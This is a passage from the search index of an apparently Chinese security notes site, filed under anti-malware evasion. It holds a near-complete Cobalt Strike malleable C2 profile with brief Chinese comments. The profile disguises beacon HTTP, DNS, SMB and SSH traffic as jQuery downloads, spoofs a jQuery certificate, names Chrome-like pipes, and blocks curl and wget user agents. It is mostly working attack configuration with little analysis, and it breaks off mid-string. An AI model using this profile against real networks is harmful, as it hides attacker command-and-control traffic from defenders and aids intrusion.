\u610f\u5473\u7740\u6bcf\u6b21HTTP\u670d\u52a1\u5668\u54cd\u5e94\u65f6\uff0c\u90fd\u4f1a\u9644\u52a0\u4e00\u4e2a\u957f\u5ea6\u57280\u5230100\u4e2a\u5b57\u7b26\u4e4b\u95f4\u7684\u968f\u673a\u5b57\u7b26\u4e32\u3002\u8fd9\u6837\u505a\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u589e\u52a0\u670d\u52a1\u5668\u54cd\u5e94\u7684\u5927\u5c0f\u7684\u4e0d\u53ef\u9884\u6d4b\u6027\uff0c\u4f7f\u5f97Cobalt Strike\u7684\u901a\u4fe1\u6a21\u5f0f\u66f4\u96be\u4ee5\u901a\u8fc7\u7f51\u7edc\u76d1\u63a7\u5de5\u5177\u88ab\u8bc6\u522b\u548c\u5206\u6790\u3002\nset data_jitter \"100\"; \n\n# \u8bbe\u7f6e\u5168\u5c40\u7684UA\u5934\nset useragent \"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\";\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article2/index.html#https-certificate-ssl","title":"https-certificate ssl\u8bc1\u4e66\u914d\u7f6e","text":"<pre><code>https-certificate {\n    set C   \"US\";    #\u56fd\u5bb6\n    set CN  \"jquery.com\";\n    set O   \"jQuery\";\n    set OU  \"Certificate Authority\";\n    set validity \"365\";\n\n    set keystore \"cobaltstrike.store\"; # \u8bc1\u4e66\u6587\u4ef6\n    set password \"1qazwsx\";  # \u8bc1\u4e66\u5bc6\u7801\n}\n</code></pre> <p>\u8bc1\u4e66\u5bc6\u7801\u6307\u7684\u662f\u4e0a\u9762\u7684\u5bc6\u94a5\u5e93\u53e3\u4ee4\u3002</p>"},{"location":"CTF/Antimalware_evasion/AV/Article2/index.html#smbtcp-smb","title":"SMB\u548cTCP , smb\u4f1a\u5728\u6a2a\u5411\u6e17\u900f\u4f7f\u7528\u5230","text":"<pre><code>### TCP Beacon \u76d1\u542c\u7aef\u53e3\nset tcp_port \"42585\";\nset tcp_frame_header \"\\x80\";\n\n### SMB Beacon \nset pipename         \"mojo.5688.8052.183894939787088877##\"; # Common Chrome named pipe  smb\u7ba1\u9053\u7684\u540d\u5b57\nset pipename_stager  \"mojo.5688.8052.35780273329370473##\"; # Common Chrome named pipe   smb stager\u7ba1\u9053\u7684\u540d\u5b57\nset smb_frame_header \"\\x80\";\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article2/index.html#dns-beacon-dns","title":"DNS beacon , \u4e0d\u7ecf\u5e38\u4f7f\u7528 , \u4f46\u662f\u5bf9\u4e8e\u53ea\u6709DNS\u534f\u8bae\u51fa\u7f51\u7684\u8bbe\u5907\u53ef\u4ee5\u4f7f\u7528","text":"<pre><code>dns-beacon {\n    set dns_idle           \"74.125.196.113\"; #google.com (change this to match your campaign)\u7b2c\u4e00\u6b21dns\u67e5\u8be2\u7684\u5730\u5740\n    set dns_max_txt        \"252\";  \u6700\u5927\u67e5\u8be2\u6b21\u6570 , 255\u4ee5\u4e0b , \u80fd\u88ab4\u6574\u9664\n    set dns_sleep          \"0\"; #    Force a sleep prior to each individual DNS request. (in milliseconds)  sleep\u65f6\u95f4\n    set dns_ttl            \"5\"; # ttl\u503c\n    set maxdns             \"255\";  # \u6700\u5927dns\u670d\u52a1\u8f6c\u63a5\u6570\u91cf\n    set dns_stager_prepend \".resources.123456.\";  #  # \u4f7f\u7528dns\u534f\u8bae\u7684\u9a6c,pe\u5934\u8ffd\u52a0\u7684\u5185\u5bb9\n    set dns_stager_subhost \".feeds.123456.\";  #  # \u5b50\u57df\u540d\u7684\u67e5\u8be2\u914d\u7f6e\n    # DNS subhosts override options, added in version 4.3\n    set beacon           \"a.bc.\";\n    set get_A            \"b.1a.\";\n    set get_AAAA         \"c.4a.\";\n    set get_TXT          \"d.tx.\";\n    set put_metadata     \"e.md.\";\n    set put_output       \"f.po.\";\n    set ns_response      \"zero\";\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article2/index.html#ssh-beacons-sshbeacon","title":"SSH beacons: \u914d\u7f6e\u7528\u4e8e\u6a2a\u5411\u79fb\u52a8\u7684SSH\u4f2aBeacon\u3002","text":"<pre><code>set ssh_banner        \"OpenSSH_7.4 Debian (protocol 2.0)\";  # SSH\u8fde\u63a5\u7684banner\u4fe1\u606f\nset ssh_pipename      \"wkssvc##\"; # \u5b9a\u4e49\u4e86\u7528\u4e8eSSH\u4f2aBeacon\u901a\u4fe1\u7684\u547d\u540d\u7ba1\u9053\u7684\u540d\u79f0\u524d\u7f00,##\u662f\u4e00\u4e2a\u5360\u4f4d\u7b26\n</code></pre> <p>http-stager \u5757\u662f\u7528\u6765\u81ea\u5b9a\u4e49HTTP\u9636\u6bb5\u5316\uff08staging\uff09\u8fc7\u7a0b\u7684\u914d\u7f6e\u3002\u9636\u6bb5\u5316\u662fCobalt Strike\u4e2d\u7684\u4e00\u4e2a\u91cd\u8981\u6982\u5ff5\uff0c\u5b83\u6307\u7684\u662f\u5c06\u7b2c\u4e8c\u9636\u6bb5\u7684\u6709\u6548\u8f7d\u8377\uff08\u5373\u7528\u4e8e\u540e\u6e17\u900f\u6d4b\u8bd5\u7684\u4ee3\u7801\uff09\u4f20\u8f93\u5230\u5df2\u7ecf\u53d7\u5230\u653b\u51fb\u8005\u63a7\u5236\u7684\u4e3b\u673a\u4e0a\u7684\u8fc7\u7a0b\u3002</p> <pre><code># \u7528\u4e8e\u6307\u5b9a\u662f\u5426\u542f\u7528\u901a\u8fc7HTTP\u3001HTTPS\u6216DNS\u8fdb\u884c\u9636\u6bb5\u5316(\u7b2c\u4e8c\u9636\u6bb5)\u7684\u6709\u6548\u8f7d\u8377\uff08payload\uff09\u6258\u7ba1\u3002\nset host_stage \"true\"; # Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.set\nhttp-stager {  \n    set uri_x86 \"/jquery-3.3.1.slim.min.js\";\n    set uri_x64 \"/jquery-3.3.2.slim.min.js\";\n    server {\n        header \"Server\" \"NetDNA-cache/2.2\";\n        header \"Cache-Control\" \"max-age=0, no-cache\";\n        header \"Pragma\" \"no-cache\";\n        header \"Connection\" \"keep-alive\";\n        header \"Content-Type\" \"application/javascript; charset=utf-8\";\n        output {\n            ## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)\n            # 2nd Line            \n            prepend \"!function(e,t){\\\"use strict\\\";\\\"object\\\"==typeof module&amp;&amp;\\\"object\\\"==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error(\\\"jQuery requires a window with a document\\\");return t(e)}:t(e)}(\\\"undefined\\\"!=typeof window?window:this,function(e,t){\\\"use strict\\\";var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l={},c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h={},g=function e(t){return\\\"function\\\"==typeof t&amp;&amp;\\\"number\\\"!=typeof t.nodeType},y=function e(t){return null!=t&amp;&amp;t===t.window},v={type:!0,src:!0,noModule:!0};function m(e,t,n){var i,o=(t=t||r).createElement(\\\"script\\\");if(o.text=e,n)for(i in v)n[i]&amp;&amp;(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)}function x(e){return null==e?e+\\\"\\\":\\\"object\\\"==typeof e||\\\"function\\\"==typeof e?l[c.call(e)]||\\\"object\\\":typeof e}var b=\\\"3.3.1\\\",w=function(e,t){return new w.fn.init(e,t)},T=/^[\\\\s\\\\uFEFF\\\\xA0]+|[\\\\s\\\\uFEFF\\\\xA0]+$/g;w.fn=w.prototype={jquery:\\\"3.3.1\\\",constructor:w,length:0,toArray:function(){return o.call(this)},get:function(e){return null==e?o.call(this):e&lt;0?this[e+this.length]:this[e]},pushStack:function(e){var t=w.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return w.each(this,e)},map:function(e){return this.pushStack(w.map(this,function(t,n){return e.call(t,n,t)}))},slice:function(){return this.pushStack(o.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(e&lt;0?t:0);return this.pushStack(n&gt;=0&amp;&amp;n&lt;t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:s,sort:n.sort,splice:n.splice},w.extend=w.fn.extend=function(){var e,t,n,r,i,o,a=arguments[0]||{},s=1,u=arguments.length,l=!1;for(\\\"boolean\\\"==typeof a&amp;&amp;(l=a,a=arguments[s]||{},s++),\\\"object\\\"==typeof a||g(a)||(a={}),s===u&amp;&amp;(a=this,s--);s&lt;u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&amp;&amp;Array.isArray(n)?n:[]):o=n&amp;&amp;w.isPlainObject(n)?n:{},a[t]=w.extend(l,o,r)):void 0!==r&amp;&amp;(a[t]=r));return a},w.extend({expando:\\\"jQuery\\\"+(\\\"3.3.1\\\"+Math.random()).replace(/\\\\D/g,\\\"\\\"),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,n;return!(!e||\\\"[object Object]\\\"!==c.call(e))&amp;&amp;(!(t=i(e))||\\\"function\\\"==typeof(n=f.call(t,\\\"constructor\\\")&amp;&amp;t.constructor)&amp;&amp;p.call(n)===d)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e){m(e)},each:function(e,t){var n,r=0;if(C(e)){for(n=e.length;r&lt;n;r++)if(!1===t.call(e[r],r,e[r]))break}else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e},trim:function(e){return null==e?\\\"\\\":(e+\\\"\\\").replace(T,\\\"\\\")},makeArray:function(e,t){var n=t||[];return null!=e&amp;&amp;(C(Object(e))?w.merge(n,\\\"string\\\"==typeof e?[e]:e):s.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:u.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,i=e.length;r&lt;n;r++)e[i++]=t[r];return e.length=i,e},grep:function(e,t,n){for(var r,i=[],o=0,a=e.length,s=!n;o&lt;a;o++)(r=!t(e[o],o))!==s&amp;&amp;i.push(e[o]);return i},map:function(e,t,n){var r,i,o=0,s=[];if(C(e))for(r=e.length;o&lt;r;o++)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)},guid:1,support:h}),\\\"function\\\"==typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\\\"Boolean Number String Function Array Date RegExp Object Error Symbol\\\".split(\\\" \\\"),function(e,t){l[\\\"[object \\\"+t+\\\"]\\\"]=t.toLowerCase()});function C(e){var t=!!e&amp;&amp;\\\"length\\\"in e&amp;&amp;e.length,n=x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\\\"array\\\"===n||0===t||\\\"number\\\"==typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)}var E=function(e){var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\\\"sizzle\\\"+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t){return e===t&amp;&amp;(f=!0),0},N={}.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t){for(var n=0,r=e.length;n&lt;r;n++)if(e[n]===t)return n;return-1},P=\\\"\\r\";\n            # 1st Line\n            prepend \"/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */\";\n            append \"\\\".(o=t.documentElement,Math.max(t.body[\\\"scroll\\\"+e],o[\\\"scroll\\\"+e],t.body[\\\"offset\\\"+e],o[\\\"offset\\\"+e],o[\\\"client\\\"+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)},t,a?i:void 0,a)}})}),w.each(\\\"blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\\\".split(\\\" \\\"),function(e,t){w.fn[t]=function(e,n){return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)}}),w.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),w.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,\\\"**\\\"):this.off(t,e||\\\"**\\\",n)}}),w.proxy=function(e,t){var n,r,i;if(\\\"string\\\"==typeof t&amp;&amp;(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function(){return e.apply(t||this,r.concat(o.call(arguments)))},i.guid=e.guid=e.guid||w.guid++,i},w.holdReady=function(e){e?w.readyWait++:w.ready(!0)},w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e){var t=w.type(e);return(\\\"number\\\"===t||\\\"string\\\"===t)&amp;&amp;!isNaN(e-parseFloat(e))},\\\"function\\\"==typeof define&amp;&amp;define.amd&amp;&amp;define(\\\"jquery\\\",[],function(){return w});var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t){return e.$===w&amp;&amp;(e.$=Kt),t&amp;&amp;e.jQuery===w&amp;&amp;(e.jQuery=Jt),w},t||(e.jQuery=e.$=w),w});\";\n            print;\n        }\n    }\n    client {\n        header \"Accept\" \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\";\n        header \"Accept-Language\" \"en-US,en;q=0.5\";\n        #header \"Host\" \"code.jquery.com\";\n        header \"Referer\" \"http://code.jquery.com/\";\n        header \"Accept-Encoding\" \"gzip, deflate\";\n    }\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article2/index.html#http-config-httphttps","title":"http-config , \u4e0d\u5355\u5355\u662fhttp\u5b9e\u9645\u4e0a\u4e5f\u662fhttps\u7684\u5168\u5c40\u54cd\u5e94\u5934\u914d\u7f6e","text":"<pre><code>http-config {\n    set headers \"Date, Server, Content-Length, Keep-Alive, Connection, Content-Type\";\n    header \"Server\" \"Apache\";\n    header \"Keep-Alive\" \"timeout=10, max=100\";\n    header \"Connection\" \"Keep-Alive\";\n    set trust_x_forwarded_for \"true\";\n    set block_useragents \"curl*,lynx*,wget*\";\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article2/index.html#http-get-teamservercsget","title":"http-get (\u65e0\u7f29\u8fdb\u8981\u6c42) , \u547d\u4ee4\u7684\u4e0b\u53d1\u76f8\u5f53\u4e8e\u662fteamserver(cs\u670d\u52a1\u7aef)\u5411\u53d7\u5bb3\u8005\u53d1\u9001\u4e00\u4e2aget\u8bf7\u6c42","text":"<pre><code>http-get {\n# \u4e0b\u53d1\u547d\u4ee4\u8bbf\u95ee\u7684uri\n    set uri \"/jquery-3.3.1.min.js\";\n    # \u8bf7\u6c42\u65b9\u6cd5\n    set verb \"GET\";\n    # \u5ba2\u6237\u7aef\u914d\u7f6e\n    client {\n    # \u8bf7\u6c42\u5934\u914d\u7f6e\n        header \"Accept\" \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\";\n        #header \"Host\" \"code.jquery.com\";\n        header \"Referer\" \"http://code.jquery.com/\";\n        header \"Accept-Encoding\" \"gzip, deflate\";\n        # \u5143\u6570\u636e\u914d\u7f6e\n        metadata {\n            base64url;\n            prepend \"__cfduid=\";\n            header \"Cookie\";\n        }\n    }\n    # \u670d\u52a1\u7aef\u914d\u7f6e\n    server {\n    # \u54cd\u5e94\u5934\u8bbe\u7f6e\n        header \"Server\" \"NetDNA-cache/2.2\";\n        header \"Cache-Control\" \"max-age=0, no-cache\";\n        header \"Pragma\" \"no-cache\";\n        header \"Connection\" \"keep-alive\";\n        header \"Content-Type\" \"application/javascript; charset=utf-8\";\n        # # \u8f93\u51fa\u4fe1\u606f\n        output {   \n            mask;\n            base64url;\n            ## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)\n            # 2nd Line    \n            # \u54cd\u5e94\u4e2dhtml\u9875\u9762\u5934\u90e8\u4fe1\u606f\n            prepend \"!function(e,t){\\\"use strict\\\";\\\"object\\\"==typeof module&amp;&amp;\\\"object\\\"==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error(\\\"jQuery requires a window with a document\\\");return t(e)}:t(e)}(\\\"undefined\\\"!=typeof window?window:this,function(e,t){\\\"use strict\\\";var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l={},c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h={},g=function e(t){return\\\"function\\\"==typeof t&amp;&amp;\\\"number\\\"!=typeof t.nodeType},y=function e(t){return null!=t&amp;&amp;t===t.window},v={type:!0,src:!0,noModule:!0};function m(e,t,n){var i,o=(t=t||r).createElement(\\\"script\\\");if(o.text=e,n)for(i in v)n[i]&amp;&amp;(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)}function x(e){return null==e?e+\\\"\\\":\\\"object\\\"==typeof e||\\\"function\\\"==typeof e?l[c.call(e)]||\\\"object\\\":typeof e}var b=\\\"3.3.1\\\",w=function(e,t){return new w.fn.init(e,t)},T=/^[\\\\s\\\\uFEFF\\\\xA0]+|[\\\\s\\\\uFEFF\\\\xA0]+$/g;w.fn=w.prototype={jquery:\\\"3.3.1\\\",constructor:w,length:0,toArray:function(){return o.call(this)},get:function(e){return null==e?o.call(this):e&lt;0?this[e+this.length]:this[e]},pushStack:function(e){var t=w.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return w.each(this,e)},map:function(e){return this.pushStack(w.map(this,function(t,n){return e.call(t,n,t)}))},slice:function(){return this.pushStack(o.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(e&lt;0?t:0);return this.pushStack(n&gt;=0&amp;&amp;n&lt;t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:s,sort:n.sort,splice:n.splice},w.extend=w.fn.extend=function(){var e,t,n,r,i,o,a=arguments[0]||{},s=1,u=arguments.length,l=!1;for(\\\"boolean\\\"==typeof a&amp;&amp;(l=a,a=arguments[s]||{},s++),\\\"object\\\"==typeof a||g(a)||(a={}),s===u&amp;&amp;(a=this,s--);s&lt;u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&amp;&amp;Array.isArray(n)?n:[]):o=n&amp;&amp;w.isPlainObject(n)?n:{},a[t]=w.extend(l,o,r)):void 0!==r&amp;&amp;(a[t]=r));return a},w.extend({expando:\\\"jQuery\\\"+(\\\"3.3.1\\\"+Math.random()).replace(/\\\\D/g,\\\"\\\"),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,n;return!(!e||\\\"[object Object]\\\"!==c.call(e))&amp;&amp;(!(t=i(e))||\\\"function\\\"==typeof(n=f.call(t,\\\"constructor\\\")&amp;&amp;t.constructor)&amp;&amp;p.call(n)===d)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e){m(e)},each:function(e,t){var n,r=0;if(C(e)){for(n=e.length;r&lt;n;r++)if(!1===t.call(e[r],r,e[r]))break}else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e},trim:function(e){return null==e?\\\"\\\":(e+\\\"\\\").replace(T,\\\"\\\")},makeArray:function(e,t){var n=t||[];return null!=e&amp;&amp;(C(Object(e))?w.merge(n,\\\"string\\\"==typeof e?[e]:e):s.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:u.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,i=e.length;r&lt;n;r++)e[i++]=t[r];return e.length=i,e},grep:function(e,t,n){for(var r,i=[],o=0,a=e.length,s=!n;o&lt;a;o++)(r=!t(e[o],o))!==s&amp;&amp;i.push(e[o]);return i},map:function(e,t,n){var r,i,o=0,s=[];if(C(e))for(r=e.length;o&lt;r;o++)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)},guid:1,support:h}),\\\"function\\\"==typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\\\"Boolean Number String Function Array Date RegExp Object Error Symbol\\\".split(\\\" \\\"),function(e,t){l[\\\"[object \\\"+t+\\\"]\\\"]=t.toLowerCase()});function C(e){var t=!!e&amp;&amp;\\\"length\\\"in e&amp;&amp;e.length,n=x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\\\"array\\\"===n||0===t||\\\"number\\\"==typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)}var E=function(e){var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\\\"sizzle\\\"+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t){return e===t&amp;&amp;(f=!0),0},N={}.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t){for(var n=0,r=e.length;n&lt;r;n++)if(e[n]===t)return n;return-1},P=\\\"\\r\";\n            # 1st Line\n            prepend \"/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */\";\n            # \u54cd\u5e94\u4e2dhtml\u9875\u9762\u5c3e\u90e8\u4fe1\u606f\n            append \"\\\".(o=t.documentElement,Math.max(t.body[\\\"scroll\\\"+e],o[\\\"scroll\\\"+e],t.body[\\\"offset\\\"+e],o[\\\"offset\\\"+e],o[\\\"client\\\"+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)},t,a?i:void 0,a)}})}),w.each(\\\"blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\\\".split(\\\" \\\"),function(e,t){w.fn[t]=function(e,n){return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)}}),w.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),w.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,\\\"**\\\"):this.off(t,e||\\\"**\\\",n)}}),w.proxy=function(e,t){var n,r,i;if(\\\"string\\\"==typeof t&amp;&amp;(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function(){return e.apply(t||this,r.concat(o.call(arguments)))},i.guid=e.guid=e.guid||w.guid++,i},w.holdReady=function(e){e?w.readyWait++:w.ready(!0)},w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e){var t=w.type(e);return(\\\"number\\\"===t||\\\"string\\\"===t)&amp;&amp;!isNaN(e-parseFloat(e))},\\\"function\\\"==typeof define&amp;&amp;define.amd&amp;&amp;define(\\\"jquery\\\",[],function(){return w});var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t){return e.$===w&amp;&amp;(e.$=Kt),t&amp;&amp;e.jQuery===w&amp;&amp;(e.jQuery=Jt),w},t||(e.jQuery=e.$=w),w});\";\n            print;\n        }\n    }\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article2/index.html#http-post-teamserverpost","title":"http-post \u7ed3\u679c\u7684\u56de\u4f20\u76f8\u5f53\u4e8e\u53d7\u5bb3\u8005\u5411teamserver\u53d1\u9001\u4e00\u4e2apost\u8bf7\u6c42","text":"<pre><code>http-post {\n# \u8bf7\u6c42\u7684\u5730\u5740\n    set uri \"/jquery-3.3.2.min.js\";\n    # \u8bf7\u6c42\u7684\u65b9\u6cd5\n    set verb \"POST\";\n    # \u5ba2\u6237\u7aef\u914d\u7f6e\n    client {\n    # \u8bf7\u6c42\u5934\n        header \"Accept\" \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\";\n        #header \"Host\" \"code.jquery.com\";\n        header \"Referer\" \"http://code.jquery.com/\";\n        header \"Accept-Encoding\" \"gzip, deflate\";\n       # \u53c2\u6570\n        id {\n            mask;       \n            base64url;\n            parameter \"__cfduid\";            \n        }\n\n        # \u8f93\u51fa\u4fe1\u606f      \n        output {\n            mask;\n            base64url;\n            print;\n        }\n    }\n    server {\n        header \"Server\" \"NetDNA-cache/2.2\";\n        header \"Cache-Control\" \"max-age=0, no-cache\";\n        header \"Pragma\" \"no-cache\";\n        header \"Connection\" \"keep-alive\";\n        header \"Content-Type\" \"application/javascript; charset=utf-8\";\n        output {\n            mask;\n            base64url;\n            ## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)\n            # 2nd Line            \n            prepend \"!function(e,t){\\\"use strict\\\";\\\"object\\\"==typeof module&amp;&amp;\\\"object\\\"==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error(\\\"jQuery requires a window with a document\\\");return t(e)}:t(e)}(\\\"undefined\\\"!=typeof window?window:this,function(e,t){\\\"use strict\\\";var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l={},c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h={},g=function e(t){return\\\"function\\\"==typeof t&amp;&amp;\\\"number\\\"!=typeof t.nodeType},y=function e(t){return null!=t&amp;&amp;t===t.window},v={type:!0,src:!0,noModule:!0};function m(e,t,n){var i,o=(t=t||r).createElement(\\\"script\\\");if(o.text=e,n)for(i in v)n[i]&amp;&amp;(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)}function x(e){return null==e?e+\\\"\\\":\\\"object\\\"==typeof e||\\\"function\\\"==typeof e?l[c.call(e)]||\\\"object\\\":typeof e}var b=\\\"3.3.1\\\",w=function(e,t){return new w.fn.init(e,t)},T=/^[\\\\s\\\\uFEFF\\\\xA0]+|[\\\\s\\\\uFEFF\\\\xA0]+$/g;w.fn=w.prototype={jquery:\\\"3.3.1\\\",constructor:w,length:0,toArray:function(){return o.call(this)},get:function(e){return null==e?o.call(this):e&lt;0?this[e+this.length]:this[e]},pushStack:function(e){var t=w.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return w.each(this,e)},map:function(e){return this.pushStack(w.map(this,function(t,n){return e.call(t,n,t)}))},slice:function(){return this.pushStack(o.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(e&lt;0?t:0);return this.pushStack(n&gt;=0&amp;&amp;n&lt;t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:s,sort:n.sort,splice:n.splice},w.extend=w.fn.extend=function(){var e,t,n,r,i,o,a=arguments[0]||{},s=1,u=arguments.length,l=!1;for(\\\"boolean\\\"==typeof a&amp;&amp;(l=a,a=arguments[s]||{},s++),\\\"object\\\"==typeof a||g(a)||(a={}),s===u&amp;&amp;(a=this,s--);s&lt;u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&amp;&amp;Array.isArray(n)?n:[]):o=n&amp;&amp;w.isPlainObject(n)?n:{},a[t]=w.extend(l,o,r)):void 0!==r&amp;&amp;(a[t]=r));return a},w.extend({expando:\\\"jQuery\\\"+(\\\"3.3.1\\\"+Math.random()).replace(/\\\\D/g,\\\"\\\"),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,n;return!(!e||\\\"[object Object]\\\"!==c.call(e))&amp;&amp;(!(t=i(e))||\\\"function\\\"==typeof(n=f.call(t,\\\"constructor\\\")&amp;&amp;t.constructor)&amp;&amp;p.call(n)===d)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e){m(e)},each:function(e,t){var n,r=0;if(C(e)){for(n=e.length;r&lt;n;r++)if(!1===t.call(e[r],r,e[r]))break}else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e},trim:function(e){return null==e?\\\"\\\":(e+\\\"\\\").replace(T,\\\"\\\")},makeArray:function(e,t){var n=t||[];return null!=e&amp;&amp;(C(Object(e))?w.merge(n,\\\"string\\\"==typeof e?[e]:e):s.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:u.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,i=e.length;r&lt;n;r++)e[i++]=t[r];return e.length=i,e},grep:function(e,t,n){for(var r,i=[],o=0,a=e.length,s=!n;o&lt;a;o++)(r=!t(e[o],o))!==s&amp;&amp;i.push(e[o]);return i},map:function(e,t,n){var r,i,o=0,s=[];if(C(e))for(r=e.length;o&lt;r;o++)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)},guid:1,support:h}),\\\"function\\\"==typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\\\"Boolean Number String Function Array Date RegExp Object Error Symbol\\\".split(\\\" \\\"),function(e,t){l[\\\"[object \\\"+t+\\\"]\\\"]=t.toLowerCase()});function 